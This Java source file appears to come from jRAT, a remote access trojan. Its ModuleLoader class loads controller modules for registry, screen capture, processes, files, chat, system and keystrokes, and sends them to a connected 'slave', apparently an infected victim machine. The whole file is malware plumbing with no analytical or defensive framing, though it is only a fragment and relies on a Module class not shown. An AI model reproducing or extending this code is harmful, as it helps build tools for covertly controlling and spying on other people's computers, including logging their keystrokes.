package jrat.controller.modules;

import jrat.api.ControllerModule;
import jrat.common.Logger;
import jrat.common.compress.QuickLZ;
import jrat.controller.AbstractSlave;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.ArrayList;
import java.util.List;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;
import java.util.jar.Manifest;

public class ModuleLoader {



    private static final List<Module> modules = new ArrayList<>();

    static {
        modules.add(new Module("registry"));
        modules.add(new Module("screen"));
        modules.add(new Module("process"));
        modules.add(new Module("fs"));
        modules.add(new Module("chat"));
        modules.add(new Module("system"));
        modules.add(new Module("keys"));
    }

    /**
     * Load all server side modules
     */
    public static void loadAll() {
        Logger.log("Loading " + modules.size() + " modules...");

        for (Module mod : modules) {
            try {
                mod.load();

                Logger.log("\t" + mod);
            } catch (Exception ex) {
                Logger.log("\t" + mod + " failed");
                ex.printStackTrace();
            }
        }
    }

    /**
     * Send all client side modules to the client
     * @param slave
     * @throws Exception
     */
    public static void sendAll(AbstractSlave slave) throws Exception {
        Logger.log("Writing " + modules.size() + " modules...");
        slave.writeInt(modules.size());

        for (Module mod : modules) {
            mod.write(slave);
        }
    }
}
